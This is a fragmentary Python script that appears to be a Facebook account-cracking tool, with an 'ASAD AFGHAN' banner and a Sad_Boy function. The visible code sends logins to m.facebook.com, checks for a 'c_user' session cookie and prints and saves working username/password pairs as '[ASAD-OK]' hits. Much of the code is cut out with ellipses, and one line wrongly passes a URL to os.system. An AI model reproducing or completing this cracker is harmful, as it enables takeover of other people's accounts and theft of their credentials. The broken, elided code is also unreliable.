...
logo =                                          """   \x1b[31m
  ...
  A)aa    S)ssss    A)aa   D)dddd        A)aa   F)ffffff   G)gggg H)    hh   A)aa   N)n   nn 
 A)  aa  S)    ss  A)  aa  D)   dd      A)  aa  F)        G)      H)    hh  A)  aa  N)nn  nn 
A)    aa  S)ss    A)    aa D)    dd    A)    aa F)fffff  G)  ggg  H)hhhhhh A)    aa N) nn nn 
A)aaaaaa      S)  A)aaaaaa D)    dd    A)aaaaaa F)       G)    gg H)    hh A)aaaaaa N)  nnnn 
A)    aa S)    ss A)    aa D)    dd    A)    aa F)        G)   gg H)    hh A)    aa N)   nnn 
A)    aa  S)ssss  A)    aa D)ddddd     A)    aa F)         G)ggg  H)    hh A)    aa N)    nn 
...
def Sad_Boy():
    ...
    if _Sad_Boy___ in ('2', '02'):
        os.system('https://www.facebook.com/profile.php?id=100058065576524&mibextid=ZbWKwL')
               ...
               'authority': 'm.facebook.com',
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [ASAD-OK] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
